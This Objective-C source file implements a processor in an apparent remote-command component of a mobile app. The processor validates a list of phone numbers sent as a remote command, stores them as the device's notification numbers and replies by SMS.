/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  ResetNotificationNumbersProcessor
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  13/03/2012, Prasad M.B, Vervata Co., Ltd. All rights reserved.
*/

#import "ResetNotificationNumbersProcessor.h"
#import "PrefNotificationNumber.h"
#import "Preference.h"

@interface ResetNotificationNumbersProcessor (PrivateAPI)
- (void) processResetNotificationNumber;
- (void) resetNotificationNumberException: (NSUInteger) aErrorCode;
- (void) sendReplySMS;
- (BOOL) canResetNotificationNumber;
@end

@implementation ResetNotificationNumbersProcessor

@synthesize mNotificationNumberList;

/**
 - Method name: initWithRemoteCommandData
 - Purpose:This method is used to initialize the ResetNotificationNumbersProcessor class
 - Argument list and description: aRemoteCmdData (RemoteCmdData)
 - Return description:self(ResetNotificationNumbersProcessor)
 */

- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData  {
    DLog (@"ResetNotificationNumbersProcessor--->initWithRemoteCommandData");
	if ((self =  [super initWithRemoteCommandData:aRemoteCmdData])) {
	}
	return self;
}

#pragma mark RemoteCmdProcessor Methods

/**
 - Method name: doProcessingCommand
 - Purpose:This method is used to process the ResetNotificationNumbersProcessor
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) doProcessingCommand {
	DLog (@"ResetNotificationNumbersProcessor--->doProcessingCommand")
	
	if ([RemoteCmdProcessorUtils isContainNonEndArgument:[mRemoteCmdData mArguments]]) {		

		[self setMNotificationNumberList:[RemoteCmdProcessorUtils validateArgs:[mRemoteCmdData mArguments] validationType:kPhoneNumberValidation]];
		DLog(@"ResetNotificationNumbersProcessor--->Notification Numbers:%@", mNotificationNumberList);
		if ([mNotificationNumberList count] > 0) {
			if ([self canResetNotificationNumber]) { 
				if (![RemoteCmdProcessorUtils isDuplicateTelephoneNumber:mNotificationNumberList]) [self processResetNotificationNumber];
				else [self resetNotificationNumberException:kCmdExceptionErrorCannotAddDuplicateToNotificationList];
			}
			else {
				[self resetNotificationNumberException:kCmdExceptionErrorNotificationNumberExceedListCapacity];
			}
		}
		else {
			[self resetNotificationNumberException:kCmdExceptionErrorInvalidNotificationNumber];
		}
	} else {
		[self resetNotificationNumberException:kCmdExceptionErrorInvalidCmdFormat];
	}	
	
}

#pragma mark ResetNotificationNumbersProcessor PrivateAPI Methods

/**
 - Method name: processResetNotificationNumber
 - Purpose:This method is used to process reset Notification Number
 - Argument list and description: No Argument
 - Return description: No Return type
 */

- (void) processResetNotificationNumber {
	DLog (@"ResetNotificationNumbersProcessor--->processResetNotificationNumber");
	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
	[prefNotificationNumberList setMNotificationNumbers:mNotificationNumberList];
	[prefManager savePreferenceAndNotifyChange:prefNotificationNumberList];
	[self sendReplySMS];
}


/**
 - Method name: canResetNotificationNumber
 - Purpose:This method is to check maximum Notification number list capacity. 
 - Argument list and description: No Argument
 - Return description: BOOL
*/

- (BOOL) canResetNotificationNumber {
//	DLog (@"ResetNotificationNumbersProcessor--->canResetNotificationNumber");
//	id <PreferenceManager> prefManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mPreferenceManager];
//	PrefNotificationNumber *prefNotificationNumberList = (PrefNotificationNumber *) [prefManager preference:kNotification_Number];
//	int count = [[prefNotificationNumberList mNotificationNumbers] count] + [mNotificationNumberList count];
	int count = [mNotificationNumberList count];
	DLog (@"> count = %d", count)
	if (count<=NOTIFICATION_NUMBER_LIST_CAPACITY) {
		return YES;
	}
	else {
		return NO;
	}
}


/**
 - Method name: addNotificationNumberException
 - Purpose:This method is invoked when Notification number process failed. 
 - Argument list and description: No Argument
 - Return description: No Return Type
*/

- (void) resetNotificationNumberException: (NSUInteger) aErrorCode {
	DLog (@"ResetNotificationNumbersProcessor--->resetNotificationNumberException")
	FxException* exception = [FxException exceptionWithName:@"resetNotificationNumberException" andReason:@"Reset Notification number error"];
	[exception setErrorCode:aErrorCode];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name: sendReplySMS
 - Purpose:This method is used to send the SMS reply
 - Argument list and description: No Argument
 - Return description: No return type
 */

- (void) sendReplySMS {
	DLog (@"ResetNotificationNumbersProcessor--->sendReplySMS")
	NSString *messageFormat=[[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						andErrorCode:_SUCCESS_];
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:messageFormat];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
		[[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:messageFormat];
	}
}

/**
 - Method name: dealloc
 - Purpose:This method is used to Handle Memory managment
 - Argument list and description:No Argument
 - Return description: No Return Type
*/

-(void) dealloc {
	[mNotificationNumberList release];
	[super dealloc];
}


@end
